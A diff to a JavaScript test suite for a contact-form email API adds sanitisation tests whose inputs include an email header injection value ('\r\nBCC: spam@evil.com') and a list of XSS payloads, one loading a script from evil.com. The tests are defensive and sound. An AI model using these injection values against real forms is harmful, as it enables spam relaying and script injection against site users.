@@ -137,10 +137,26 @@ describe("Testing the POST api", () => {
       expect(res.status).toBe(200);
       // Confirm the script tag was stripped — resend mock should have been called with clean data
       const callArg = getMockSend().mock.calls[0][0]
-      console.log(callArg)
       expect(callArg.html).not.toContain("<script>")
       expect(callArg.from).not.toContain("<script>")
       expect(callArg.subject).not.toContain("<script>")
+    })
+
+    it("should remove all newline characters from the name input field", async () => {
+
+      const response = await POST(request({
+        name: "Charlie\r\nBCC: spam@evil.com",
+        email: "cupcakes@gmail.com",
+        phone: "07987123765",
+        message: "hi"
+      }))
+
+      expect(response.status).toBe(200);
+
+      const callArg = getMockSend().mock.calls[0][0]
+      expect(callArg.from).not.toMatch(/\r|\n/)
+      expect(callArg.html).not.toMatch(/\r\nBCC :/)
+      expect(callArg.subject).not.toMatch(/\r|\n/)
     })
 
     it("should strip newline characters from the email field to prevent header injection", async () => {
@@ -158,22 +174,52 @@ describe("Testing the POST api", () => {
       const callArg = getMockSend().mock.calls[0][0]
       expect(callArg.replyTo).not.toMatch(/\r|\n/)
     })
+
+const xssEmailPayloads = [
+  '<script>alert("XSS")</script>@example.com',
+  'test@<script>alert("XSS")</script>.com',
+  '<ScRiPt>alert("XSS")</ScRiPt>@example.com',
+  '"><img src=x onerror="alert(\'XSS\')"@example.com',
+  '<script src="https://evil.com/steal.js">@example.com',
+]
+
+xssEmailPayloads.forEach((maliciousEmail) => {
+it(`should strip script tag characters from the email (${maliciousEmail}) field to prevent code injection`, async () => {
+
+      const response = await POST(
+        request({
+        name: "Charlie",
+        email: maliciousEmail,
+        phone: "09876543234",
+        message: "Hello"
+      }))
+
+      expect(response.status).toBe(200)
+
+      const callArg = getMockSend().mock.calls[0][0]
+      expect(callArg.replyTo).not.toContain("<script>")
+      expect(callArg.replyTo).not.toContain("</script>")
+      expect(callArg.html).not.toContain("</script>")
+      expect(callArg.html).not.toContain("<script>")
+      expect(callArg.html).not.toContain("onerror")
+      expect(callArg.html).not.toContain("onmouseover")
+    })
+  })
+
     it("should strip all script tags and malicious characters from the message input field", async () => {
       const response = await POST(
         request({
           name: "Fiona",
           email: "gremlin@cave.com",
           phone: "07541236987",
-          message: "<script>alert('xss')</script>\n\rHello"
+          message: "<script>alert('xss')</script>Hello"
         })
       )
 
       expect(response.status).toBe(200)
 
       const callArg = getMockSend().mock.calls[0][0]
-      console.log(callArg.message )
-      expect(callArg.message)
-
+      expect(callArg.html).not.toContain("<script>alert('xss')</script>")
     })
   })
 })
